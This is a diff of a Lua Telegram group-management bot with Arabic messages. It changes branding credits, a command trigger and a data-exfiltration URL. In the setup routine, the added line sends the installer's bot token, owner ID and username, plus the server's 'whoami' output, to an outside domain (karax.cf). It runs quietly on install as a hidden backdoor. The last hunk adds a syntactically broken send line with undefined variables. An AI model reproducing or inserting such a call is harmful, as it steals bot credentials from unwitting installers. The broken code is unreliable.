@@ -70,7 +70,7 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('http://karax.ga/boyka/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
+https.request('http://karax.cf/boyka/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("BOYKA", "w")  
 file:write([[
@@ -151,7 +151,6 @@ print([[
 > CH › @BOBBW
 > CH › @BBEBW
 ~> DEVELOPER › @JJEJJ
-~> DEVELOPER › @MMMM_27
 ]])
 sudos = dofile("./Info.lua") 
 SUDO = tonumber(sudos.SUDO)
@@ -3741,7 +3740,7 @@ if b.first_name_ == false then
 send(msg.chat_id_, msg.id_,"⚠️| حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "TSHAKETEAM")
+local UserName = (b.username_ or "BOBBW")
 send(msg.chat_id_, msg.id_,"👁️‍🗨️| منشئ المجموعه ← ["..b.first_name_.."](T.me/"..UserName..")")  
 end,nil)   
 end
@@ -8377,8 +8376,8 @@ end
 send(msg.chat_id_, msg.id_,first_name..'\n'..last_name) 
 end,nil)
 end 
-if text == 'ايديي' then
-send(msg.chat_id_, msg.id_,'📮| ايديك » '..msg.sender_user_id_)
+if text == 'موقعي' then
+send(msg.chat_id_, msg.id_,'📮| ايديك » '..msg.sender_user_id_)\nاسمك ← {`'..(result.first_name_)..'`}' \n📮| عدد جهاتك *» { '..Num..' } *' \n🚸| عدد سحكاتك *» { '..Num..' } *'
 end
 if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 then
 function start_function(extra, result, success)
